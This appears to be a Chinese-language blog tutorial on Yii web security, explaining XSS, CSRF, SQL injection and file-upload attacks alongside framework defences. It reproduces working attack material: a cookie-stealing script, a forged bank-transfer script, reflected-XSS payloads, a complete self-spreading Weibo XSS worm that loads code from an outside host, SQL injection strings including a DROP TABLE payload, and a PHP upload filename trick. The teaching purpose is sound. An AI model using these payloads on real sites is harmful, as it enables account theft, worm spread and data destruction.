---
title: Yii-安全篇
date: 2017-07-02 11:56:02
tags:
	- yii安全
	- 安全
	- xss
	- csrf
	- sql注入
	- 文件上传漏洞
categories:
	- 安全
---

## xss攻击  
> 想方设法把js注入到页面中，可以通过url(反射性)或者 提交数据(提交的数据会保存在后台，显示在页面)
**跨站脚本攻击(Cross Site Scripting)**  
将js代码插入到给用户使用的页面中，从而对用户进行攻击  

**盗取用户账号(使用cookie登陆)**  
将下面代码出入页面，当用户访问这个页面的时候将会把cookie发送给自己，在cookie中寻找自己需要的登陆cookie
```js
<script>
var cookie = document.cookie;
window.location.href = 'http://127.0.0.1/index.php?cookie = '+cookie
</script>
```
将cookie设置成httponly，js将无法读取这条cookie  

**非法转账**  

自动转账的代码逻辑，自动填写并确认跳转
```js
document.getElementById('ipt-search-key').value = 'ding@163.com';//自动填写转账的账户
document.getElementById('amount').value = '100';//自动填写转账的金额
document.getElementById('reason').value = '劫富济贫';//自动填写原因
document.getElementsByClassName('ui-button-text')[0].click();//自动跳转
```
将javascript注入到其他页面，但是需要注入到用户使用的转账的页面，这个是比较难的，需要使用反射性xxs

### 反射性xss
> 原理：将js代码赋值给url需要get传参的key，后台获取到这个key又会原原本本的将这个key输出到前端页面  
选好需要攻击的网站页面，url需要有get传参的内容，确定后台获取到get传参的key值会将其原原本本的输出到前端页面，这样就可以进行攻击了  

将js代码赋值给url的get需要传参的key，例如  
```
//url
www.basic.com/index.php?r=article/post&name=abc<script>alert('hello world')</script>
//but，浏览器会智能过滤掉js标签  
//可以通过后端设置响应头让其不过滤
\YII:$app->response->headers->add('x-xss-Protection', '0');
//后端的逻辑是直接将获取到的name直接到页面
echo \YII:$app->request->get('name');
```
输出的内容可能被编码转换成字符串,导致无法执行
例如：
```
"abc%3Cscript%3Ealert('hello world')%3C/script%3E"
//%3Cscript%3E即<script>
```
假设，后台获取到这个name值后将其放进了js中(可以通过实验，查看源码，看后台将获取到的数据放到哪里了)
```js
<script>
...
{
    ...
    pageAbsUrl:"...name=abc%3Cscript%3Ealert('hello world')%3C/script%3E"
    ...
}
...
</script>
```
因为，已经有了`<script>`标签，所以传入的不需要 `<script>` 标签了，根据放入的位置拼装执行代码
最后可执行的代码的样子
```js
<script>
...
{
    ...
    pageAbsUrl:"...name=abc",alert('hello world')//"
    ...
}
...
</script>
```
所以需要将url改成
```
www.basic.com/index.php?r=article/post&name=abc",alert('hello world')//
```
又一个问题，经过自动编译处理将会把 `"` 变成 `%22` 导致无法执行
这就需要使用 HTML实体编码
**HTML实体编码**
查看HTML实体编码表
`"`可以使用 `&quot;` 代替
但是url会根据 `&` 进行参数分割
可以使用url编码将 `&` 编码 `%26`
**url编码**
通过查看URL编码表
js的 `escape()`方法

最后，因为获取内容放在 `<script>` 中，在js环境中是不认识HTML实体编码的，所以还是无法执行
但是，如果没有在 `<script>` 的是可行的

### xxs蠕虫攻击
xxs worm
页面中插入js代码，发布，当用户访问的时候，又会以访问用户的身份发布文章，感染性极强

示例
```js
http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update
```
使用js的 `uneacape()` 将转义一下可以看到
```
"http://weibo.com/pub/star/g/xyyyd"><script src=//www.2kt.cn/images/t.js></script>?type=update"
```
当用户访问这个页面的时候将会去加载 `t.js`,在t.js中实现逻辑
```js
function createXHR(){
	return window.XMLHttpRequest?
	new XMLHttpRequest():
	new ActiveXObject("Microsoft.XMLHTTP");
}
function getappkey(url){
	xmlHttp = createXHR();
	xmlHttp.open("GET",url,false);
	xmlHttp.send();
	result = xmlHttp.responseText;
	id_arr = '';
	id = result.match(/namecard=\"true\" title=\"[^\"]*/g);
	for(i=0;i<id.length;i++){
		sum = id[i].toString().split('"')[3];
		id_arr += sum + '||';
	}
	return id_arr;
}
function random_msg(){
	link = ' http://163.fm/PxZHoxn?id=' + new Date().getTime();;
	var msgs = [
		'郭美美事件的一些未注意到的细节：',
		'建党大业中穿帮的地方：',
		'让女人心动的100句诗歌：',
		'3D肉团团高清普通话版种子：',
		'这是传说中的神仙眷侣啊：',
		'惊爆!范冰冰艳照真流出了：',
		'杨幂被爆多次被潜规则:',
		'傻仔拿锤子去抢银行：',
		'可以监听别人手机的软件：',
		'个税起征点有望提到4000：'];
	var msg = msgs[Math.floor(Math.random()*msgs.length)] + link;
	msg = encodeURIComponent(msg);
	return msg;
}
function post(url,data,sync){
	xmlHttp = createXHR();
    xmlHttp.open("POST",url,sync);
    xmlHttp.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
    xmlHttp.send(data);
}
function publish(){
	url = 'http://weibo.com/mblog/publish.php?rnd=' + new Date().getTime();
	data = 'content=' + random_msg() + '&pic=&styleid=2&retcode=';
	post(url,data,true);
}
function follow(){
	url = 'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&atnId=profile&rnd=' + new Date().getTime();
	data = 'uid=' + 2201270010 + '&fromuid=' + $CONFIG.$uid + '&refer_sort=profile&atnId=profile';
	post(url,data,true);
}
function message(){
	url = 'http://weibo.com/' + $CONFIG.$uid + '/follow';
	ids = getappkey(url);
	id = ids.split('||');
	for(i=0;i<id.length - 1 & i<5;i++){
		msgurl = 'http://weibo.com/message/addmsg.php?rnd=' + new Date().getTime();
		msg = random_msg();
		msg = encodeURIComponent(msg);
		user = encodeURIComponent(encodeURIComponent(id[i]));
		data = 'content=' + msg + '&name=' + user + '&retcode=';
		post(msgurl,data,false);
	}
}
function main(){
	try{
		publish();
	}
	catch(e){}
	try{
		follow();
	}
	catch(e){}
	try{
		message();
	}
	catch(e){}
}
try{
   x="g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)";window.opener.eval(x);
}
catch(e){}
main();
var t=setTimeout('location="http://weibo.com/pub/topic";',5000);
```

**预防**  
1.使用 `\yii\helpers\Html::encode('内容');` 进行html实体编码转义  
2.将过滤掉js的代码 `\yii\helpers\HtmlPurifier::process('内容');` 浏览器认为哪段是js代码，yii就根据浏览器相同的算法识别出js代码

## CSRF攻击
> 原理：。将组装好的url发布到公共可以浏览的地方，当浏览点击这个链接的时候会实现攻击了(**如果可以跨过登陆的话，用户可能登陆过并多少天内记录了自动登陆功能，或者刚访问过了那个要攻击网站，这样就跨过登陆了**)，也可以通过表单  

跨站请求伪造攻击，和xss很相似  
将执行的url放在页面里，用户点击将会执行，比如说删除的连接，转账的链接，就是简单的一个链接请求可以直接执行，而不需要js来去辅助执行

**get类型的CSRF攻击**
例如，某网上银行的漏洞
```
http://www.xxxbank.com/index.php?from=zhangsan&to=lisi&money=400
//zhangsan转给lisi400块
```

**post类型的CSRF攻击**
需要用户先登录，仿照需要攻击的网站的表单，设法让用户访问自己的仿照的表单发送给攻击的网站而达成目的

### CSRF防御
1.判断 `Referer` 头,但是有时候请求不会携带这个请求头  
2.防伪措施，请求表单的时候，将防伪标识插入到表单，表单提交的时候进行比对

yii默认是开启防止CSRF攻击的 表单中加入 `name = _csrf` 的隐藏input标签  
同时将 `_csrf` 存入到cookie中，请求的时候两个都会进行携带，进行比对，cookie中的是加过密的，后台获取后进行解密，并和表单进行比对
控制器获取 `_csrf` 的值
```
\YII::$app->requrst->csrfToken;
```

## sql注入

示例
```sql
//根据用户账号密码查询漏洞
select * from users where name = 'zhangsan' and password = 'xxxxx'
//1.将用户名设置为
zhangsan' --    即可破解 // --在mysql表示注释
select * from users where name = 'zhangsan' --' and password = 'xxxxx'

//2.将用户名设置为
'; drop table users; --  将会删除users表
select * from users where name = ''; drop table users; --' and password = 'xxxxx'

//根据关键字查询并有限制的语句
select * from articles where score<60 and title like '%关键词%'
//1.查询出所有结果
将关键词设置为
' or 1=1 --     即可破解 or也可以使用 || 代替
```
还有就是使用编码导致的(GBK),php将 `'` 单引号转义后 `\'` 如果遇到特殊的字符一起，并不能很好会将前面的字符和 `\` 组成一个字符，而将 `'` 暴漏出来，导致入侵

**sql防范**
数据库配置有一个选项，可以配置转义工作发生在php端还是mysql端，在mysql端转义更安全  
```sql
 'emulatePrepare'=>false,
```
可以通过 ***wireshark*** 软件抓包查看发送给mysql的数据  

## 文件上传漏洞  

Fiddler工具可以抓取浏览器的请求，并进行阻断
***Rules--->Automatic Breakpoints--->Before Requests*** 添加断点，在请求发出去前进行阻断，
<!-- ![](http://img.mukewang.com/58ca8586000104cb12800720.jpg) -->
修改后可以***Run to Completion***继续进行请求

可以修改文件的type

通过系统的漏洞来利用上传漏洞
系统在命名文件的时候是不允许使用特殊符号的例如 `:` ,通过修改器截获的请求，将文件名改成 `photo.php:x.jpg` ,如果在后端是使用上传的原文件名 `name` 进行保存的  
```
move_uploaded_file($_FILES['photo']['tmp_name'], './'.$_FILES['photo']['name']);
```
在保存 `photo.php:x.jpg` 的时候将会保存成  `photo.php`  

所以尽量不要使用用户给的文件名
